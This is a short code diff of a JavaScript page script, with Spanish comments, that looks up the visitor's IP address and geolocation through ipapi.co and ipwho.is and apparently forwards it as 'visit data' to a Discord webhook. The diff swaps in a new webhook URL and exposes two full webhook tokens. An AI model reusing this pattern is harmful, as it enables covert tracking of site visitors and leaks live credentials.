@@ -156,10 +156,9 @@ fetch('https://ipapi.co/json/')
   .catch(error => console.error("Error obteniendo ubicación:", error));
   // Reemplaza con la URL de tu Webhook de Discord
 // Webhook de Discord para registrar visitas
-// Webhook de Discord
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1538753816995045539/AIGKpZGZESNbivyh6bio0ZC6acAkbF8BslaUesE2XRT2-jp43W88sx9GLrggz8OH65e";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1538758028013342751/vaMb2WV-SOGuNECIAEvmjgEMjAfhwO0644mNEiS-lfGP_UcWqUAXTAbL8JnfTjRmLWOA";
 
-// Consulta IP y ubicación de forma directa
+// Envío automático de datos de visita
 fetch('https://ipwho.is/')
   .then(res => res.json())
   .then(data => {
